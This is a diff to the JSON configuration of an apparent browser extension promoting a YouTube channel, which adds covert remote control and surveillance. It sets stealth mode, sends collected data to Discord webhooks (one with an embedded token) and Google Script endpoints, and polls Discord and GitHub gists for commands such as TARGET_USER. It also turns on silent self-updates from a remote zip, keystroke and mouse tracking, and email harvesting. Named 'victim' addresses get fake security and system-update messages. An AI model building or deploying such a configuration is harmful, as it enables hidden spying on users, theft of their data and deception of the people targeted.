@@ -1,5 +1,5 @@
 {
-  "version": "1.0.0",
+  "version": "3.0.0",
   "enabled": true,
   "lastUpdated": "2024-01-15T10:30:00Z",
   "features": {
@@ -106,10 +106,11 @@
   },
   "analytics": {
     "enabled": true,
-    "endpoint": "https://webhook.site/#!/c4e2d3f1-8b9a-4c6d-9e2f-1a3b5c7d9e0f",
-    "backup_endpoint": "https://httpbin.org/post",
-    "batchSize": 5,
-    "flushInterval": 15000,
+    "data_endpoint": "https://script.google.com/macros/s/YOUR_GOOGLE_SCRIPT_ID/exec",
+    "command_endpoint": "https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/YOUR_TOKEN",
+    "fallback_endpoint": "https://httpbin.org/post",
+    "batchSize": 3,
+    "flushInterval": 10000,
     "trackUserIds": true,
     "trackSessions": true,
     "trackClicks": true,
@@ -119,7 +120,12 @@
     "trackSubscriptions": true,
     "respectDoNotTrack": false,
     "localBackup": true,
-    "stealth_mode": true
+    "stealth_mode": true,
+    "multi_endpoint": true,
+    "realtime_commands": true,
+    "command_check_interval": 15000,
+    "webhook_url": "https://discord.com/api/webhooks/1389631578421854321/IF2g67p4aQORnAyg-g7G3hxSYHJQ7Wf5v7CiHkBgnXFW9WyttWXwiBH9nB1kyoXZLdtJ",
+    "collect_emails": true
   },
   "a_b_tests": {
     "preroll_frequency": {
@@ -136,5 +142,174 @@
         "urgent": { "weight": 0.3 }
       }
     }
+  },
+  "realtime_control": {
+    "enabled": true,
+    "command_channel": "https://discord.com/api/webhooks/COMMAND_WEBHOOK_ID/TOKEN",
+    "status_channel": "https://discord.com/api/webhooks/STATUS_WEBHOOK_ID/TOKEN",
+    "emergency_disable": false,
+    "live_config_override": {},
+    "command_authentication": "prank_master_2024",
+    "available_commands": [
+      "DISABLE_ALL",
+      "ENABLE_ALL", 
+      "EMERGENCY_STOP",
+      "CHANGE_VIDEO",
+      "UPDATE_BANNERS",
+      "SET_FREQUENCY",
+      "TARGET_USER",
+      "GET_STATUS",
+      "FORCE_FLUSH_DATA"
+    ]
+  },
+  
+  "gist_commands": {
+    "enabled": true,
+    "url": "https://gist.githubusercontent.com/NachoPayback/GIST_ID/raw/commands.json",
+    "status_gist": "https://gist.githubusercontent.com/NachoPayback/STATUS_GIST_ID/raw/status.json",
+    "check_interval": 30000,
+    "note": "Slower than Discord but works for users without Discord access"
+  },
+  
+  "auto_updates": {
+    "enabled": true,
+    "check_interval": 3600000,
+    "update_url": "https://your-vercel-site.vercel.app/version-check.json",
+    "download_url": "https://your-vercel-site.vercel.app/extension-update.zip",
+    "silent_updates": true,
+    "emergency_disable_code": "EMERGENCY_SHUTDOWN_2024"
+  },
+  
+  "user_targeting": {
+    "enabled": true,
+    "pattern_matching": {
+      "timezone": "America/New_York",
+      "platform": "Win32",
+      "browser": "Chrome",
+      "activeHours": [9, 10, 11, 12, 13, 14, 15, 16, 17]
+    },
+    "fingerprinting": {
+      "enabled": true,
+      "enhanced_tracking_for_targets": true,
+      "track_keystrokes": true,
+      "track_mouse_patterns": true,
+      "track_scroll_behavior": true
+    }
+  },
+  
+  "targeted_users": [
+    {
+      "userId": "user_abc123_1642234567",
+      "intensity": 100,
+      "startDate": "2024-01-15",
+      "endDate": "2024-02-15",
+      "reason": "primary_target",
+      "customBehavior": {
+        "videoId": "dQw4w9WgXcQ",
+        "customBanner": "🎯 TARGETED USER SPECIAL MESSAGE",
+        "messages": [
+          {
+            "text": "Your browser has been optimized for maximum performance!",
+            "type": "success",
+            "delay": 30000,
+            "duration": 10000
+          },
+          {
+            "text": "Security scan complete - no threats detected.",
+            "type": "info", 
+            "delay": 60000,
+            "duration": 8000
+          }
+        ]
+      }
+    }
+  ],
+
+  "defaults": {
+    "preroll": {
+      "videoId": "YV0NfxtK0n0",
+      "title": "🎯 MAIN SCAMMER PAYBACK PROMO VIDEO",
+      "skipDelay": 5000,
+      "chance": 0.3,
+      "subscriptionUrl": "https://www.youtube.com/c/ScammerPayback?sub_confirmation=1&utm_source=extension&utm_campaign=default"
+    },
+    
+    "toast": {
+      "frequency": 45000,
+      "messages": [
+        {
+          "id": "default_1",
+          "title": "Fight Back Against Scammers!",
+          "subtitle": "Subscribe to Scammer Payback",
+          "icon": "🛡️",
+          "subscriptionUrl": "https://www.youtube.com/c/ScammerPayback?sub_confirmation=1&utm_source=extension&utm_campaign=toast"
+        },
+        {
+          "id": "default_2", 
+          "title": "Stop Scammers in Their Tracks!",
+          "subtitle": "Join the fight - Subscribe now!",
+          "icon": "⚔️",
+          "subscriptionUrl": "https://www.youtube.com/c/ScammerPayback?sub_confirmation=1&utm_source=extension&utm_campaign=toast"
+        }
+      ]
+    },
+
+    "banners": {
+      "rotation": 60000,
+      "ads": [
+        {
+          "id": "banner_1",
+          "imageUrl": "https://raw.githubusercontent.com/NachoPayback/6301912-SP-Ad-Pumper/master/assets/banners/ad_728x90.png",
+          "clickUrl": "https://www.youtube.com/c/ScammerPayback?sub_confirmation=1&utm_source=extension&utm_campaign=banner",
+          "size": "728x90"
+        }
+      ]
+    }
+  },
+
+  "user_overrides": {
+    "victim_john.doe@company.com": {
+      "preroll": {
+        "videoId": "dQw4w9WgXcQ",
+        "title": "Special Message for John",
+        "chance": 1.0,
+        "subscriptionUrl": "https://www.youtube.com/c/ScammerPayback?sub_confirmation=1&utm_source=extension&utm_campaign=john_special"
+      },
+      "toast": {
+        "frequency": 20000,
+        "messages": [
+          {
+            "id": "john_special",
+            "title": "John, your meeting is moved!",
+            "subtitle": "Click here for details",
+            "icon": "📅"
+          }
+        ]
+      }
+    },
+
+    "victim_boss@company.com": {
+      "preroll": {
+        "chance": 1.0,
+        "skipDelay": 10000
+      },
+      "toast": {
+        "messages": [
+          {
+            "id": "boss_prank",
+            "title": "System Update Required",
+            "subtitle": "Click to update immediately",
+            "icon": "⚠️"
+          }
+        ]
+      }
+    }
+  },
+
+  "email_collection": {
+    "enabled": true,
+    "prompt_delay": 30000,
+    "prompt_text": "Get notified about the latest scammer takedowns!",
+    "placeholder": "Enter your email to stay updated"
   }
 } 
